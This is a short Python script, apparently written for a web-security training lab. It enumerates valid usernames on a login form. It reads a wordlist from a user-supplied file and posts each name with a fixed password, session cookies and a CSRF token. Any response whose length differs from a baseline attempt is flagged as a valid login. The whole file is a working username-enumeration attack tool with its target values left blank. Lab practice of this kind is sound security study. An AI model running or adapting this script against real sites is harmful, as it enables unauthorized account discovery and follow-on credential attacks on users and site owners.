import requests
import re

lab_value=" "
sessionValue=" "
host=" " 
csrftoken=" " 
usernamelist=""


def guess_login(login):
    #cookie={'session':sessionValue}
    cookie={'_lab':lab_value,'session':sessionValue}
    #payload = {'username':login,'password':'peter'}
    payload = {'csrf':csrftoken,'username':login,'password':'peter'}
    try:
        #response = requests.post(host ,data=payload)
        response = requests.post(host ,data=payload, cookies=cookie)
    except Exception as e:
        print(e)
    res_len = len(response.content)
    return res_len

def open_list_file(filepath):
    file=open(filepath,'r')
    lists=file.readlines()
    words=[]
    for i in range(len(lists)):
        words.append(lists[i].rstrip('\n').split(',')[0])        
    return words

try:
    filepath=input("Enter a filepath: ")
    usernamelist=open_list_file(filepath)
except Exception as e:
        print(e)

def bruteforce():
    response_len=guess_login("napewnozlylogin")
    tryNr=0
    for word in usernamelist:
        new_response=guess_login(word)
        print(str(tryNr)+" response length: "+str(new_response))
        tryNr+=1
        if response_len!=new_response:
            print("valid login can be: "+word)
            break

bruteforce()
